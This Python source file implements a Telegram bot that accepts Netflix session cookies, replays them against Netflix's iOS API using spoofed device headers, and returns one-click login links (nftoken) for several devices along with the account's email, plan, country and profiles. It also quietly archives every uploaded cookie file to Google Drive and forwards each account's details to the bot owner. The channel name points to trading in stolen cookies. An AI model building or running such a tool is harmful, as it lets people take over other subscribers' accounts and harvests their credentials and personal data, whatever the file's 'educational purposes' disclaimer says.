# full x.main.py — Drive-only storage integration, syntax error fixed

import asyncio
import html as html_mod
import os
import json
import re
import time
import urllib.parse
import hashlib
from datetime import datetime
from keep_alive import keep_alive
import requests
from urllib3.exceptions import InsecureRequestWarning
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    MessageHandler,
    filters,
    CallbackQueryHandler,
)

# Configuration
OWNER_ID = 1249057893
CHANNEL_USERNAME = "@cookiesnetflix1"  # make sure the bot is admin in this channel
CHANNEL_ID = None  # optional numeric channel id (-100...)

# Import netflix_account.py (must be present)
from netflix_account import fetch_account_info_sync

# Google Drive storage helper (uploads directly, no local writes)
import drive_storage

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

BOT_DISPLAY_NAME = "Flexible X"
BOT_USERNAME = "@Flexible_x_bot"

# Conversation state
WAITING_FOR_FILE = 1

# Archive (kept for compatibility but we will not write locally when USE_GDRIVE=1)
ARCHIVE_FOLDER = "archive_files"
HASHES_FILE = "hashes.txt"

# Netflix iOS API params
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

# File protection
MAX_FILE_SIZE_KB = 50
MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_KB * 1024
COMPRESSED_EXTENSIONS = {".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz", ".iso"}

user_states = {}

# Messages
def _welcome_text() -> str:
    return (
        f"{BOT_DISPLAY_NAME} ({BOT_USERNAME}) — Netflix Token Checker 🎬\n\n"
        "Available for PC and mobile (Android & iPhone).\n\n"
        "Send your Netflix cookies (Netscape export, JSON array, or plain cookie header text) and I will:\n"
        " • extract a direct login link (nftoken) usable on PC, Android, and iPhone\n"
        " • attempt to retrieve account info (plan, email, country, profiles, features)\n\n"
        "How to use:\n"
        " • Press the 📥 Scan New File button, then upload a small .txt with cookies, OR\n"
        " • Paste the cookie text directly while the bot is waiting.\n"
        " • After processing, tap the Login button for PC / Android / iPhone.\n\n"
        f"To use the bot you must be subscribed to our channel: {CHANNEL_USERNAME}\n"
        "Only check cookies you own or have permission to test. This tool is provided for educational purposes."
    )


def _ask_for_file_text() -> str:
    return "Please send the cookie file now (upload a .txt or paste the cookie text). I will check it and reply with results."


def _invalid_cookie_user_message() -> str:
    return (
        "❌ Failed — Could not retrieve a valid token for this cookie.\n\n"
        "This usually means the cookie is incomplete, expired, malformed, or Netflix blocked the request.\n"
        "Steps you can try:\n"
        " • Make sure you pasted the full cookie (including NetflixId)\n"
        " • Try converting Netscape cookies to JSON using the converter tool\n"
        " • Try again later (network or Netflix protections can cause temporary failures)\n\n"
        "If you're stuck, click a button below or send /start to reset the bot."
    )

# Cookie parsing & token fetch helpers
def _get_file_extension(filename: str) -> str:
    if not filename:
        return ""
    return os.path.splitext(filename)[1].lower()


def _is_compressed_file(filename: str) -> bool:
    ext = _get_file_extension(filename)
    return ext in COMPRESSED_EXTENSIONS


def _calculate_file_hash(file_bytes: bytes) -> str:
    return hashlib.md5(file_bytes).hexdigest()


def _decode_cookie_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value


def extract_cookie_dict(text):
    cookie_dict = {}
    for key in COOKIE_KEYS:
        match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if match:
            cookie_dict[key] = _decode_cookie_value(match.group(1))
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        parts = re.split(r"\s+", line)
        if len(parts) >= 2:
            name = parts[-2].strip()
            value = parts[-1].strip()
            if name in COOKIE_KEYS and name not in cookie_dict:
                cookie_dict[name] = _decode_cookie_value(value)
    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        data = None
    if isinstance(data, list):
        for cookie in data:
            name = cookie.get("name")
            value = cookie.get("value")
            if name in COOKIE_KEYS and isinstance(value, str):
                cookie_dict[name] = _decode_cookie_value(value)
    elif isinstance(data, dict):
        if any(key in data for key in COOKIE_KEYS):
            for key in COOKIE_KEYS:
                value = data.get(key)
                if isinstance(value, str):
                    cookie_dict[key] = _decode_cookie_value(value)
        elif isinstance(data.get("cookies"), list):
            for cookie in data["cookies"]:
                name = cookie.get("name")
                value = cookie.get("value")
                if name in COOKIE_KEYS and isinstance(value, str):
                    cookie_dict[name] = _decode_cookie_value(value)
    return cookie_dict


def _sg(d, *keys, default="N/A"):
    for k in keys:
        if not isinstance(d, dict):
            return default
        d = d.get(k)
        if d is None:
            return default
    val = d
    if val in ("", {}, []):
        return default
    return str(val)


def _make_cookie_str(cookie_dict):
    nid = cookie_dict.get("NetflixId", "")
    snid = cookie_dict.get("SecureNetflixId", "")
    parts = [f"NetflixId={nid}"]
    if snid:
        parts.append(f"SecureNetflixId={snid}")
    for k in ("nfvdid", "OptanonConsent"):
        v = cookie_dict.get(k)
        if v:
            parts.append(f"{k}={v}")
    return "; ".join(parts)


def fetch_netflix_data(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        raise ValueError("Could not find 'NetflixId' in the provided text.")
    cookie_str = _make_cookie_str(cookie_dict)
    headers = dict(BASE_HEADERS)
    headers["Cookie"] = cookie_str
    params = list(QUERY_PARAMS.items()) + [("path", '["account","token","default"]')]
    response = requests.get(API_URL, params=params, headers=headers, timeout=30, verify=False)
    response.raise_for_status()
    raw = response.json()
    val = raw.get("value") or {}
    account = val.get("account") or {}
    token_data = (account.get("token") or {}).get("default") or {}
    token = token_data.get("token")
    expires = token_data.get("expires")
    if not token:
        raise ValueError("Operation failed — the server did not return a token.")
    if isinstance(expires, int) and len(str(expires)) == 13:
        expires //= 1000
    return {"token": token, "expires": expires}


def format_expiry(expires):
    if not isinstance(expires, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(expires)

# Rate limiting & registration
RATE_FILE = "rate_limits.json"
USERS_FILE = "users.txt"
BATCH_LIMIT = 5
BATCH_COOLDOWN = 5 * 60
DAILY_LIMIT = 24
DAILY_WINDOW = 24 * 60 * 60

def _load_rates() -> dict:
    if os.path.exists(RATE_FILE):
        try:
            with open(RATE_FILE, "r") as f:
                return json.load(f)
        except Exception:
            pass
    return {}


def _save_rates(data: dict) -> None:
    with open(RATE_FILE, "w") as f:
        json.dump(data, f)


def _check_rate_limit(user_id: int):
    if user_id == OWNER_ID:
        return True, None
    now = time.time()
    rates = _load_rates()
    uid = str(user_id)
    user = rates.get(uid, {
        "batch_count": 0,
        "batch_reset_at": 0,
        "daily_count": 0,
        "daily_reset_at": now + DAILY_WINDOW,
    })
    if now >= user.get("daily_reset_at", 0):
        user["daily_count"] = 0
        user["daily_reset_at"] = now + DAILY_WINDOW
    if user.get("daily_count", 0) >= DAILY_LIMIT:
        remaining = int(user["daily_reset_at"] - now)
        h, m = divmod(remaining // 60, 60)
        return False, (
            f"⛔ <b>Daily limit reached.</b>\n"
            f"You can process up to {DAILY_LIMIT} files per 24 hours.\n"
            f"Try again in <b>{h}h {m}m</b>."
        )
    if now >= user.get("batch_reset_at", 0):
        user["batch_count"] = 0
    if user.get("batch_count", 0) >= BATCH_LIMIT:
        remaining = int(user["batch_reset_at"] - now)
        m, s = divmod(remaining, 60)
        return False, (
            f"⏳ <b>Slow down!</b>\n"
            f"You sent {BATCH_LIMIT} files in a row.\n"
            f"Please wait <b>{m}m {s}s</b> before sending more."
        )
    user["batch_count"] = user.get("batch_count", 0) + 1
    user["daily_count"] = user.get("daily_count", 0) + 1
    if user["batch_count"] >= BATCH_LIMIT:
        user["batch_reset_at"] = now + BATCH_COOLDOWN
    rates[uid] = user
    _save_rates(rates)
    return True, None


def _register_user(user_id: int) -> bool:
    existing: set[str] = set()
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r") as f:
            existing = {line.strip() for line in f if line.strip()}
    uid = str(user_id)
    if uid in existing:
        return False
    with open(USERS_FILE, "a") as f:
        f.write(uid + "\n")
    return True


def _get_common_keyboard():
    channel_url = f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}" if CHANNEL_USERNAME else "https://t.me/"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Channel", url=channel_url)],
        [InlineKeyboardButton("📥 Scan New File", callback_data="scan_file")],
    ])


async def _send_error_response(target_update_or_message, error_text: str, user_id: int):
    user_states[user_id] = None
    fallback_instruction = "\n\nIf you are stuck, please click the button below or send /start to reset the bot."
    full_error_text = error_text + fallback_instruction
    common_keyboard = _get_common_keyboard()
    if isinstance(target_update_or_message, Update):
        await target_update_or_message.message.reply_text(
            full_error_text,
            parse_mode="HTML",
            reply_markup=common_keyboard,
            disable_web_page_preview=True
        )
    else:
        await target_update_or_message.edit_text(
            full_error_text,
            parse_mode="HTML",
            reply_markup=common_keyboard,
            disable_web_page_preview=True
        )

# Subscription helper
async def _is_user_subscribed(bot, user_id: int) -> bool:
    chat_id = CHANNEL_ID if CHANNEL_ID else CHANNEL_USERNAME
    try:
        member = await bot.get_chat_member(chat_id=chat_id, user_id=user_id)
        return member.status in ("member", "administrator", "creator")
    except Exception:
        return False

# Callback: Scan button (checks subscription)
async def scan_file_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    subscribed = await _is_user_subscribed(context.bot, user_id)
    if not subscribed:
        join_text = (
            f"To use this bot you must subscribe to our channel: {CHANNEL_USERNAME}\n\n"
            "Please join the channel, then press the button below and I will check again."
        )
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("Join channel", url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")],
            [InlineKeyboardButton("I Joined ✅", callback_data="check_sub")],
        ])
        await query.edit_message_text(text=join_text, reply_markup=keyboard, disable_web_page_preview=True)
        return
    user_states[user_id] = WAITING_FOR_FILE
    await query.edit_message_text(text=_ask_for_file_text(), reply_markup=None)

# Callback: "I Joined" re-check
async def check_subscription_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    subscribed = await _is_user_subscribed(context.bot, user_id)
    if subscribed:
        user_states[user_id] = WAITING_FOR_FILE
        await query.edit_message_text(text="Thanks — I see you joined. Now send the cookie file or paste the cookie text.", reply_markup=None)
    else:
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("Join channel", url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")],
            [InlineKeyboardButton("I Joined ✅", callback_data="check_sub")],
        ])
        await query.edit_message_text(text="I still can't see you as a channel member. Make sure you joined the channel with the same account and press 'I Joined'.", reply_markup=keyboard, disable_web_page_preview=True)

# Callback: Restart / Scan again — FIXED (added to avoid NameError)
async def scan_again_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    user_states[user_id] = None
    # Replace message with welcome text and keyboard
    try:
        await query.edit_message_text(text=_welcome_text(), reply_markup=_get_common_keyboard(), disable_web_page_preview=True)
    except Exception:
        # If edit failed (message replaced), send a new message
        await query.message.reply_text(_welcome_text(), reply_markup=_get_common_keyboard(), disable_web_page_preview=True)

# Start handler (notifies OWNER_ID only)
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    is_new = _register_user(user.id)
    if is_new:
        name = html_mod.escape(user.full_name or "—")
        username = f"@{html_mod.escape(user.username)}" if user.username else "—"
        notify_text = (
            "👤 <b>New user joined the bot!</b>\n\n"
            f"🔹 <b>Name:</b> {name}\n"
            f"🔹 <b>Username:</b> {username}\n"
            f"🔹 <b>ID:</b> <code>{user.id}</code>"
        )
        try:
            await context.bot.send_message(chat_id=OWNER_ID, text=notify_text, parse_mode="HTML")
        except Exception:
            print("⚠️ Could not send new-user notification to OWNER_ID (they may not have started the bot).")
    user_states[user.id] = None
    await show_welcome_message(update, context)

async def show_welcome_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(_welcome_text(), reply_markup=_get_common_keyboard(), disable_web_page_preview=True)

# Core function: parse cookies, fetch token, fetch account, reply and notify owner
async def _run_cookie_check(raw_text: str, processing_msg, user_id: int, file_bytes: bytes = None, file_name: str = None) -> None:
    try:
        cookie_dict = extract_cookie_dict(raw_text)
        if not cookie_dict:
            await _send_error_response(processing_msg, "❌ Could not read the cookies. Please check the format and try again.", user_id)
            return

        # Fetch NFT token
        try:
            info = fetch_netflix_data(cookie_dict)
        except ValueError as ve:
            msg = str(ve)
            if "did not return a token" in msg or "could not find 'netflixid'" in msg.lower():
                await _send_error_response(processing_msg, _invalid_cookie_user_message(), user_id)
            else:
                await _send_error_response(processing_msg, f"⚠️ Failed:\n{msg}", user_id)
            return

        pc_url = f"https://netflix.com/?nftoken={info['token']}"
        tv_url = f"https://netflix.com/tv8?nftoken={info['token']}"
        expiry_date = html_mod.escape(format_expiry(info["expires"]))

        # Fetch account info in thread with timeout
        try:
            try:
                coro = asyncio.to_thread(fetch_account_info_sync, cookie_dict)
            except AttributeError:
                loop = asyncio.get_running_loop()
                coro = loop.run_in_executor(None, fetch_account_info_sync, cookie_dict)
            account = await asyncio.wait_for(coro, timeout=30)
        except asyncio.TimeoutError:
            account = {"valid": False}
        except Exception:
            account = {"valid": False}

        # Build account text (profiles names only)
        if not account.get("valid"):
            account_text = "\n❗ Could not retrieve account page (cookie may be expired or blocked)."
        else:
            plan = html_mod.escape(account.get("plan") or "Unknown")
            email = html_mod.escape(account.get("email") or "Unknown")
            country = html_mod.escape(account.get("country") or "Unknown")

            profile_names = account.get("profile_names") or []
            profiles_text = ""
            if profile_names:
                display_limit = 8
                display_names = profile_names[:display_limit]
                names_text = ", ".join(html_mod.escape(n) for n in display_names)
                if len(profile_names) > display_limit:
                    names_text = f"{names_text}, and more..."
                profiles_text = f"\n👥 <b>Profiles:</b> {names_text}"

            extra_allowed = account.get("extra_members_allowed")
            extra_text = "Yes" if extra_allowed else "No"

            features = account.get("features") or []
            features_text = ", ".join(features) if features else "None detected"

            account_text = (
                f"\n📄 <b>Plan:</b> {plan}\n"
                f"✉️ <b>Email:</b> {email}\n"
                f"🌍 <b>Country:</b> {country}"
                f"{profiles_text}\n"
                f"➕ <b>Extra members allowed:</b> {extra_text}\n"
                f"⚙️ <b>Features:</b> {html_mod.escape(features_text)}"
            )

        result_text = (
            "✅ <b>Account is active</b>\n\n"
            f"⏱ <b>Token expires:</b> {expiry_date}"
            + account_text
        )

        # 6-button keyboard
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🖥️ Login PC", url=pc_url), InlineKeyboardButton("📺 Login TV", url=tv_url)],
            [InlineKeyboardButton("🤖 Login Android", url=pc_url), InlineKeyboardButton("🍏 Login iPhone", url=pc_url)],
            [InlineKeyboardButton("📥 Upload File", callback_data="scan_file"), InlineKeyboardButton("🔁 Restart", callback_data="scan_again")],
        ])

        await processing_msg.edit_text(result_text, parse_mode="HTML", reply_markup=keyboard, disable_web_page_preview=True)

        # Archive / Google Drive handling (no local writes)
        archive_status = "N/A"
        file_hash = None
        if file_bytes:
            try:
                file_hash = _calculate_file_hash(file_bytes)
                if os.environ.get("USE_GDRIVE", "").lower() in ("1", "true", "yes"):
                    orig_name = file_name or getattr(processing_msg, "document", None) or "uploaded.txt"
                    msg_id = getattr(processing_msg, "message_id", None)
                    stored_id, created = await asyncio.to_thread(
                        drive_storage.store_file_from_bytes,
                        file_bytes,
                        orig_name,
                        user_id,
                        msg_id,
                    )
                    archive_status = "stored" if created else "duplicate"
                else:
                    archive_status = "disabled"
            except Exception as exc:
                archive_status = f"error: {exc}"

        # Notify owner only
        try:
            profiles_for_owner = ", ".join(account.get("profile_names") or []) or "None detected"
            owner_text = (
                "👤 <b>User activity</b>\n"
                f"• <b>ID:</b> <code>{user_id}</code>\n"
                f"• <b>Action:</b> {'uploaded file' if file_bytes else 'pasted cookie text'}\n"
                f"• <b>Archive status:</b> {archive_status}\n"
                f"• <b>File hash:</b> {file_hash or 'N/A'}\n\n"
                "🔒 <b>Account summary</b>\n"
                f"• <b>Plan:</b> {html_mod.escape(account.get('plan') or 'Unknown')}\n"
                f"• <b>Email:</b> {html_mod.escape(account.get('email') or 'Unknown')}\n"
                f"• <b>Country:</b> {html_mod.escape(account.get('country') or 'Unknown')}\n"
                f"• <b>Profiles:</b> {html_mod.escape(profiles_for_owner)}\n"
                f"• <b>Token expiry:</b> {expiry_date}\n"
            )
            await processing_msg.bot.send_message(chat_id=OWNER_ID, text=owner_text, parse_mode="HTML")
        except Exception:
            print("⚠️ Could not send owner notification (OWNER_ID may not have started the bot)")

        user_states[user_id] = None

    except requests.RequestException as exc:
        await _send_error_response(processing_msg, f"⚠️ Connection error:\n{exc}", user_id)
    except Exception as exc:
        await _send_error_response(processing_msg, f"⚠️ Unexpected error:\n{exc}", user_id)

# File upload handler: checks subscription first (so direct attach triggers join prompt)
async def process_cookie_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # Subscription check
    subscribed = await _is_user_subscribed(context.bot, user_id)
    if not subscribed:
        join_text = (
            f"To use this bot you must subscribe to our channel: {CHANNEL_USERNAME}\n\n"
            "Please join the channel, then press the button below and I will check again."
        )
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("Join channel", url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")],
            [InlineKeyboardButton("I Joined ✅", callback_data="check_sub")],
        ])
        await update.message.reply_text(join_text, reply_markup=keyboard, disable_web_page_preview=True)
        return

    if user_states.get(user_id) != WAITING_FOR_FILE:
        await _send_error_response(update, "⚠️ Please press the (📥 Scan New File) button first before sending the file.", user_id)
        return

    doc = update.message.document

    if _is_compressed_file(doc.file_name or ""):
        await _send_error_response(update, "❌ Sorry, compressed files are not accepted.", user_id)
        return
    if doc.file_size and doc.file_size > MAX_FILE_SIZE_BYTES:
        await _send_error_response(update, "⚠️ The file size is too large! The maximum allowed size is 50 KB only.", user_id)
        return
    if not doc.mime_type or not doc.mime_type.startswith("text"):
        await _send_error_response(update, "⚠️ Please send a plain text (.txt) file containing your Netflix cookies.", user_id)
        return

    allowed, limit_msg = _check_rate_limit(user_id)
    if not allowed:
        await _send_error_response(update, limit_msg, user_id)
        return

    processing_msg = await update.message.reply_text("⏳ Reading file and checking cookies...")
    try:
        tg_file = await context.bot.get_file(doc.file_id)
        raw_bytes = await tg_file.download_as_bytearray()
        raw_text = raw_bytes.decode("utf-8", errors="replace")
    except Exception as exc:
        await _send_error_response(processing_msg, f"⚠️ Could not read the file:\n{exc}", user_id)
        return
    await _run_cookie_check(raw_text, processing_msg, user_id, file_bytes=bytes(raw_bytes), file_name=doc.file_name)

# Plain text cookie handler
async def process_cookie_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    subscribed = await _is_user_subscribed(context.bot, user_id)
    if not subscribed:
        join_text = (
            f"To use this bot you must subscribe to our channel: {CHANNEL_USERNAME}\n\n"
            "Please join the channel, then press the button below and I will check again."
        )
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("Join channel", url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")],
            [InlineKeyboardButton("I Joined ✅", callback_data="check_sub")],
        ])
        await update.message.reply_text(join_text, reply_markup=keyboard, disable_web_page_preview=True)
        return

    if user_states.get(user_id) != WAITING_FOR_FILE:
        await _send_error_response(update, "⚠️ Please press the (📥 Scan New File) button first before sending the file.", user_id)
        return

    allowed, limit_msg = _check_rate_limit(user_id)
    if not allowed:
        await _send_error_response(update, limit_msg, user_id)
        return

    processing_msg = await update.message.reply_text("⏳ Checking cookies and connecting to servers...")
    await _run_cookie_check(update.message.text, processing_msg, user_id)

# Heartbeat & init
async def _heartbeat(application) -> None:
    while True:
        await asyncio.sleep(60)
        try:
            await application.bot.get_me()
            print("✅ Bot is active — Telegram connection OK")
        except Exception as exc:
            print(f"⚠️ Heartbeat failed: {exc} — connection lost, polling will auto-reconnect")

async def _post_init(application) -> None:
    asyncio.create_task(_heartbeat(application))

# Run
if __name__ == "__main__":
    bot_token = os.environ.get("BOT_TOKEN")
    if not bot_token:
        raise ValueError("BOT_TOKEN environment variable is not set.")
    app = (
        ApplicationBuilder()
        .token(bot_token)
        .post_init(_post_init)
        .get_updates_read_timeout(60)
        .get_updates_write_timeout(60)
        .get_updates_connect_timeout(30)
        .get_updates_pool_timeout(30)
        .build()
    )

    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CallbackQueryHandler(scan_file_button, pattern="^scan_file$"))
    app.add_handler(CallbackQueryHandler(scan_again_button, pattern="^scan_again$"))
    app.add_handler(CallbackQueryHandler(check_subscription_callback, pattern="^check_sub$"))
    app.add_handler(MessageHandler(filters.Document.MimeType("text/plain"), process_cookie_file))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), process_cookie_message))

    # initialize Google Drive storage if enabled
    try:
        if os.environ.get("USE_GDRIVE", "").lower() in ("1", "true", "yes"):
            try:
                drive_storage.init_from_env()
            except Exception as exc:
                print(f"⚠️ Could not initialize Google Drive storage: {exc}")
    except Exception:
        pass

    keep_alive()
    print("Bot is running...")
    app.run_polling(timeout=60, drop_pending_updates=False)
